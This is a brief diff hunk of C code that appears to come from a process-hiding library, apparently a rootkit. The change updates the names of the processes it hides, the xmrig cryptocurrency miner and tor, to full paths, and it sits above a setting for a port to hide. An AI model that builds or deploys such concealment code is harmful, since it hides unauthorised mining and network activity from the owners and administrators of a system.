@@ -27,8 +27,8 @@
 /*
  * Every process with this name will be excluded
  */
-static const char *process_to_filter_1 = "xmrig";
-static const char *process_to_filter_2 = "tor";
+static const char *process_to_filter_1 = "/usr/bin/xmrig";
+static const char *process_to_filter_2 = "/usr/bin/tor";
 
 /**
  * Port to hide
